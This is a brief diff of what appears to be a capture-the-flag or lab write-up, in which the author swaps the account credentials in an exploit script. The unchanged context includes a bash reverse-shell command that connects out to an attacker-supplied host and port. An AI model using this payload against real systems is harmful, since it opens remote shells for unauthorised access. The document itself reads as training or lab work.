@@ -185,8 +185,8 @@ Password: Password123!
 I updated the exploit script with the registered account's credentials.
 
 ```python
-username = "user"
-password = "Password123!"
+username = "ben1"
+password = "ben123"
 
 command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
 
